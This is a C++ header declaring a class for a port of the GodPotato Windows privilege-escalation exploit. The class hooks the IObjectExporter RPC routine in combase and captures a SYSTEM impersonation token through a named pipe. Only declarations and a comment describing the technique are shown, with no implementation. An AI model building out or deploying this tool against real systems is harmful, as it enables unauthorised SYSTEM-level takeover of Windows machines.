#pragma once

#include "common.h"

// Port of GodPotatoContext: locates the IObjectExporter RPC_SERVER_INTERFACE in
// combase, hooks its UseProtseq server routine, and runs the named-pipe server
// that catches the SYSTEM impersonation token from rpcss.
class GodPotatoContext {
public:
    GodPotatoContext() = default;
    ~GodPotatoContext();

    bool Init();

    void HookRPC();
    void Restore();

    bool Start();
    void Stop();

    // Waits for the pipe server to publish a token; ownership is transferred.
    HANDLE WaitToken(DWORD timeoutMs);

    uintptr_t combaseModule() const { return combaseModule_; }
    void* dispatchTable() const { return dispatchTablePtr_; }
    void* originalUseProtseq() const { return originalUseProtseq_; }
    uint32_t paramCount() const { return paramCount_; }

private:
    static DWORD WINAPI PipeThreadProc(LPVOID param);
    void PublishToken(HANDLE token);

    uintptr_t combaseModule_ = 0;
    size_t moduleSize_ = 0;
    void* dispatchTablePtr_ = nullptr;
    void* originalUseProtseq_ = nullptr;
    uint32_t paramCount_ = 0;

    bool isHook_ = false;
    bool isStart_ = false;

    HANDLE pipeHandle_ = INVALID_HANDLE_VALUE;
    HANDLE pipeThread_ = nullptr;
    HANDLE tokenEvent_ = nullptr;
    HANDLE token_ = nullptr;
};
